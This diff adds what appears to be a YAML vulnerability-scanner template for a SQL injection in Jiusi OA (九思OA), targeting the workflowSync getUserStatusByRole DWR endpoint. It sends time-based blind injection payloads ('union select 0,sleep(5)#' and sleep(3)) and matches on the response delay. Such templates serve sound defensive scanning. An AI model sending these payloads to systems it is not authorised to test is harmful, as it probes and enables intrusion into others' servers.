@@ -1,0 +1,37 @@
+name: 九思OA-workflowSync-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 7
+matchCount: 2
+rules:
+  - method: POST
+    path: /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: |
+        callCount=1
+        c0-scriptName=workflowSync
+        c0-methodName=getUserStatusByRole
+        c0-id=1
+        c0-param0=string:1
+        c0-param1=string:1 union select 0,sleep(5)#
+        xml=true
+    expression:
+      status: 200
+      sleep: 5
+  - method: POST
+    path: /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: |
+        callCount=1
+        c0-scriptName=workflowSync
+        c0-methodName=getUserStatusByRole
+        c0-id=1
+        c0-param0=string:1
+        c0-param1=string:1 union select 0,sleep(3)#
+        xml=true
+    expression:
+      status: 200
+      sleep: 3
